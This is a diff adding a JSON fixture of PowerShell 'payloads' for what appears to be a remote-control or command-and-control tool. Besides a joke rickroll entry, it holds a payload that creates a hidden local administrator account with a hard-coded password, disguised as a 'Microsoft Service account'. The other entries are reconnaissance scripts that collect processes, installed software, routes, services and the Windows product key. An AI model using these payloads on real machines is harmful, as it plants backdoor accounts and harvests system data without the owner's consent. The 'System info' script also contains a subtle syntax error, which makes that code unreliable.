@@ -1,0 +1,66 @@
+[
+  {
+    "model": "payloads.Payload",
+    "pk": 1,
+    "fields": {
+      "payload_name": "Rick Astley 4 President",
+      "payload_description": "Opens YouTube video of Rick Astley with Never Gonna Give You Up",
+      "payload": "start https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+    }
+  },
+  {
+    "model": "payloads.Payload",
+    "pk": 2,
+    "fields": {
+      "payload_name": "Create admin user",
+      "payload_description": "Creates admin user with username 'mssrvc' and password 'salainensana'",
+      "payload": "$pwd = ConvertTo-SecureString \"salainensana\" -asPlainText -Force\nNew-LocalUser \"mssrvc\" -Password $pwd -FullName \"mssrvc\" -Description \"Microsoft Service account\"\nAdd-LocalGroupMember -Group \"Administrators\" -Member \"mssrvc\""
+    }
+  },
+  {
+    "model": "payloads.Payload",
+    "pk": 3,
+    "fields": {
+      "payload_name": "Process info",
+      "payload_description": "Gets the list of all running processes",
+      "payload": "$ProcessesWmi = Get-WmiObject Win32_Process\n$processArray = @()\nforeach($Process in $ProcessesWmi){\n    $processObject = [ordered]@{\n        \"processId\" = $Process.ProcessId\n        \"name\" = $Process.name\n        \"executablePath\" = $Process.ExecutablePath\n    }\n    $processArray += $processObject\n}\n$JSONArray = ConvertTo-Json $processArray\nreturn $JSONArray"
+    }
+  },
+  {
+    "model": "payloads.Payload",
+    "pk": 4,
+    "fields": {
+      "payload_name": "Installed applications",
+      "payload_description": "Gets the name, version, publisher and install date of all installed applications in the system",
+      "payload": "$applications = Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate\n$JSONArray = @(ConvertTo-JSON $applications)\nreturn $JSONArray"
+    }
+  },
+  {
+    "model": "payloads.Payload",
+    "pk": 5,
+    "fields": {
+      "payload_name": "IPV4 routes",
+      "payload_description": "Gets all known IPV4 routes known to the system, along with netmask and protocol information",
+      "payload": "$IPv4Routes = Get-WmiObject Win32_IP4RouteTable | Select-Object -Property Name, Mask, Protocol\n$ProtocolList = @(\"NaN\", \"other\", \"local\", \"netmgmt\", \"icmp\", \"egp\", \"ggp\", \"hello\", \"rip\", \"is-is\", \"es-is\", \"ciscolgrp\", \"bbnSpflgp\", \"ospf\", \"bgp\")\n$objectArray = @()\nforeach($obj in $IPv4Routes){\n    $routeObject = [ordered]@{ \n        \"name\" = $obj.Name\n        \"mask\" = $obj.Mask\n        \"protocol\" = $ProtocolList[$obj.protocol]\n    }\n    $objectArray += $routeObject\n}\n\n$JSONArray = ConvertTo-Json $objectArray\nreturn $JSONArray"
+    }
+  },
+  {
+    "model": "payloads.Payload",
+    "pk": 6,
+    "fields": {
+      "payload_name": "System services",
+      "payload_description": "Gets all the information about system services",
+      "payload": "$serviceInfo = Get-WmiObject Win32_Service\n$serviceArray = @()\nforeach($obj in $serviceInfo){\n    $serviceObject = [ordered]@{\n        \"name\" = $obj.Name\n        \"processId\" = $obj.ProcessId\n        \"startMode\" = $obj.StartMode\n        \"state\" = $obj.State\n    }\n    $serviceArray += $serviceObject\n}\n$JSONArray = ConvertTo-Json $serviceArray\nreturn $JSONArray"
+    }
+  },
+  {
+    "model": "payloads.Payload",
+    "pk": 7,
+    "fields": {
+      "payload_name": "System info",
+      "payload_description": "Prints OS's name, version, hostname, windows product key, processor information, GPU information, RAM information",
+      "payload": "$info = [ordered]@{}\n\n$OSWmi = Get-WmiObject Win32_OperatingSystem\n$OSWmiProps = @(\"Caption\", \"Version\", \"CSName\")\n$OSInfo = @($OSWmi, $OSWmiProps, \"OS\")\n\n$KeyWmi = Get-WmiObject SoftwareLicensingService\n$KeyWmiProps = @(\"OA3xOriginalProductKey\")\n$KeyInfo = @($KeyWmi, $KeyWmiProps)\n\n$CPUWmi = Get-WmiObject Win32_Processor\n$CPUWmiProps = @(\"DeviceID\", \"Name\", \"Caption\", \"MaxClockSpeed\", \"SocketDesignation\")\n$CPUInfo = @($CPUWmi, $CPUWmiProps, \"CPU\")\n\n$GPUWmi = Get-WmiObject Win32_VideoController\n$GPUWmiProps = @(\"DeviceID\", \"Name\", \"AdapterRAM\", \"VideoModeDescription\", \"MaxRefreshRate\", \"MinRefreshRate\")\n$GPUInfo = @($GPUWmi, $GPUWmiProps, \"GPU\")\n\n$RAMWmi = Get-WmiObject Win32_PhysicalMemory\n$RAMWmiProps = @(\"Manufacturer\", \"PartNumber\", \"ConfiguredClockSpeed\", \"Speed\", \"DeviceLocator\", \"DataWidth\")\n$RAMInfo = @($RAMWmi, $RAMWmiProps. \"RAM\")\n\n$info = @($OSInfo, $KeyInfo, $CPUInfo, $GPUInfo, $RAMInfo)\n$output = [ordered]@{}\n\nforeach($object in $info){\n    foreach($str in $object[1]){\n        $output[$object[2] + $str] = $object[0].$str\n    }\n}\n$JSONArray = ConvertTo-Json $output\nreturn $JSONArray"
+    }
+  }
+
+]
